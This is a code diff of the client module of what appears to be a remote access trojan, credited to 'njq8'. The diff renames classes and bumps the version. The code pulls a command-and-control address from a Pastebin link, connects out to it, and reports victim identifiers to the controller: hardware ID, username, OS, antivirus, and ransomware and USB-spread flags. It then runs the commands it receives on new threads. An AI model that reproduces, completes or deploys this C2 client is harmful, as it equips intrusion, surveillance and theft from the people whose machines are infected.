@@ -1,11 +1,11 @@
 ﻿
-Public Class Client
+Public Class C_Socket
     'credit to njq8
-    Public Shared KEY As String = Convert.ToBase64String(SB("|'N'|"))
-    Public Shared SPL As String = "|'L'|"
+    Public Shared KEY As String = Convert.ToBase64String(SB(C_Settings.KEY))
+    Public Shared SPL As String = C_Settings.SPL
     Public Shared C As Net.Sockets.TcpClient
     Public Shared R As New Random
-    Public Shared T1 As New Threading.Thread(AddressOf RECON)
+    Public Shared T1 As New Threading.Thread(AddressOf Connect)
     Public Shared CNT As Boolean = False
 
     Public Shared Sub Send(ByVal b As Byte())
@@ -22,10 +22,10 @@ Public Class Client
     End Sub
 
     Public Shared Sub Send(ByVal S As String)
-        Send(SB(AES_Encrypt(S)))
+        Send(SB(C_Encryption.AES_Encrypt(S)))
     End Sub
 
-    Public Shared Sub RECON()
+    Public Shared Sub Connect()
         Dim MS As New IO.MemoryStream ' create memory stream
         Dim KA As Integer = 0
 re:
@@ -46,7 +46,7 @@ re:
 rr:
                 If BS(MS.ToArray).Contains(KEY) Then ' split packet..
                     Dim A As Array = SplitWord(MS.ToArray, KEY)
-                    Dim T As New Threading.Thread(AddressOf Commands.Data)
+                    Dim T As New Threading.Thread(AddressOf C_Commands.Data)
                     T.Start(A(0))
                     MS.Dispose()
                     MS = New IO.MemoryStream
@@ -81,20 +81,24 @@ e:      ' clear things and ReConnect
             C.Client.SendBufferSize = 999999
             C.Client.ReceiveBufferSize = 999999
             KA = 0
+#If DEBUG Then
+            C_Settings.HOST = "192.168.1.24"
+            C_Settings.PORT = 8989
+#Else
 
             Try
                 Dim WC As Net.WebClient = New Net.WebClient() 'Pastebin, split by ":" IP:PORT
-                Dim reply As String = WC.DownloadString(Settings.Pastebin)
-                Settings.HOST = reply.Split(":")(0)
-                Settings.PORT = reply.Split(":")(1)
+                Dim reply As String = WC.DownloadString(C_Settings.Pastebin)
+                C_Settings.HOST = reply.Split(":")(0)
+                C_Settings.PORT = reply.Split(":")(1)
                 WC.Dispose()
             Catch ex As Exception
             End Try
-
-            C.Client.Connect(Settings.HOST, Settings.PORT)
+#End If
+            C.Client.Connect(C_Settings.HOST, C_Settings.PORT)
             CNT = True
             'Send info to server
-            Send("info" & SPL & ID.HWID & SPL & ID.UserName & SPL & IO.Path.GetFileName(Application.ExecutablePath) & SPL & "v0.5.7" & SPL & ID.MyOS & " " & ID.Bit & SPL & ID.INDATE & SPL & ID.AV & SPL & ID.Ransomeware & SPL & ID.USBSP & SPL & " ")
+            Send("info" & SPL & C_ID.HWID & SPL & C_ID.UserName & SPL & IO.Path.GetFileName(Application.ExecutablePath) & SPL & "v0.5.8" & SPL & C_ID.MyOS & " " & C_ID.Bit & SPL & C_ID.INDATE & SPL & C_ID.AV & SPL & C_ID.Ransomeware & SPL & C_ID.USBSP & SPL & " ")
         Catch ex As Exception
             Threading.Thread.CurrentThread.Sleep(R.Next(5000))
             GoTo e
